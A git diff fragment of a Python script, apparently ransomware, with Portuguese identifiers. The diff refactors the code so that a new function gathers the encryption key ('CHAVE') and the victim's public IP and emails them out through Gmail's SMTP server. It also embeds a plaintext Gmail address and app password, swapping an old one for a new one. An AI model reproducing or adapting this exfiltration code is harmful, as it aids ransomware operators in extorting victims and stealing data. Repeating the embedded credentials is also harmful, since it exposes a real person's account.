@@ -81,9 +81,11 @@ while True:
 
 print('parece que os arquivos já foram encriptados')
 
+dados = []
+
 
 def obtemInformacao():
-    dados = []
+
     dados.append('CHAVE --->\n')
     dados.append(key)
     dados.append('\n\n')
@@ -116,15 +118,18 @@ def obtemInformacao():
 
     ipExterno = f'public IP: {ip}'
     dados.append(ipExterno)
+
+
+def enviaInformacao():
     result = ''.join(''.join(map(str, tup)) for tup in dados)
     print(result)
-
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.login("jeffersonssantos93@gmail.com", "erxtuxuhsosskgwf")
+    server.login("jeffersonssantos93@gmail.com", "muzwoulszlsmoqjx")
     server.sendmail('jeffersonssantos93@gmail.com',
                     'jeffersonssantos92@gmail.com', result)
     server.quit()
 
 
 obtemInformacao()
+enviaInformacao()
 #
